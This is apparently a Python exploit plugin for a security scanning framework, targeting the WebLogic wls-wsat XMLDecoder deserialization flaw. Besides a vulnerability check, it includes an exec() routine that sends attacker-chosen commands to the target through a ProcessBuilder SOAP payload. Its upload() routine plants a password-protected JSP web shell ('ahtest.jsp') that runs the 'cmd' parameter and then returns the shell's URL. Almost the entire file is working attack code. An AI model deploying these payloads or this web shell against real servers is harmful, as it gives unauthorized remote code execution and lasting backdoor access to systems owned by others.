#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import random
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

shellpoc1 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">


    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ahtest.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%
    if("ahtest".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[102400];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    out.print("ahtest");
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object>
    </java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''

shellpoc2 = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">  <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/ahtest.jsp</string>
    <void method="println"><string>
    <![CDATA[
    <%
    if("ahtest".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[102400];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
    out.print("ahtest");
    %>]]>
    </string>
    </void>
    <void method="close"/>
    </object>

    </java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>'''

html_escape_table = {
    "&": "&amp;",
    '"': "&quot;",
    "'": "&apos;",
    ">": "&gt;",
    "<": "&lt;",
}
poc1 = '''
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="'''

poc3 = '''
</array>
<void method="start" />
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
</soapenv:Body>
</soapenv:Envelope>
'''

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEBLOGIC

    async def prove(self):
        if self.base_url:
            headers = {"Content-Type": "text/xml"}
            url = self.base_url+'wls-wsat/CoordinatorPortType'
            ran = str(random.randint(100000, 999999))
            poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/' + ran + '.txt</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
            async with ClientSession() as session:
                async with session.post(url=url,data=poc, headers=headers) as result:
                    pass
                targeturl = self.base_url + "/bea_wls_internal/" + ran + ".txt"
                async with session.get(url=targeturl) as result:
                    if result and result.status == 200:
                        text = await result.text()
                        if 'xmldecoder_vul_test' in text:
                            yield url
                    else:
                        ran = str(random.randint(100000, 999999))
                        poc = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"> <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/' + ran + '.txt</string><void method="println"><string>xmldecoder_vul_test</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'

                        async with session.post(url=url, data=poc, headers=headers) as result:
                            pass
                        targeturl = self.base_url + "/wls-wsat/" + ran + ".txt"
                        async with session.get(url=url) as result:
                            if result and result.status == 200:
                                text = await result.text()
                                if 'xmldecoder_vul_test' in text:
                                    yield targeturl


    async def exec(self):
        if self.base_url:
            headers = {"Content-Type": "text/xml"}
            poc2 = ''
            poc = None
            command = self.parameter['cmd']
            if command != None:
                commands = command.split()
                for i in range(0, len(commands)):
                    poc2 += '<void index="' + str(i) + '"><string>' + "".join(
                        html_escape_table.get(c, c) for c in commands[i]) + '</string></void>'
                poc = poc1 + str(len(commands)) + '">' + poc2 + poc3
            targeturl = self.base_url + "/wls-wsat/CoordinatorPortType"
            async with ClientSession() as session:
                async with session.post(url=targeturl, data=poc, headers=headers) as result:
                    if result and result.status == 500:
                        yield result.text


    async def upload(self):
        if self.base_url:
            async with ClientSession() as session:
                headers = {"Content-Type": "text/xml"}
                url = self.base_url + 'wls-wsat/CoordinatorPortType'
                async with session.post(url=url, data=shellpoc1, headers=headers) as result:
                    pass
                targeturl = self.base_url + "/bea_wls_internal/ahtest.jsp"
                async with session.get(url=targeturl) as result:
                    if result and result.status == 200:
                        text = await result.text()
                        if 'ahtest' in text:
                            yield targeturl + "?pwd=ahtest&cmd=whoami"
                    else:
                        async with session.post(url=url, data=shellpoc2, headers=headers) as result:
                            pass
                        targeturl = self.base_url + "/wls-wsat/ahtest.jsp"
                        async with session.get(url=targeturl) as result:
                            if result and result.status == 200:
                                text = await result.text()
                                if 'ahtest' in text:
                                    yield targeturl + "?pwd=ahtest&cmd=whoami"
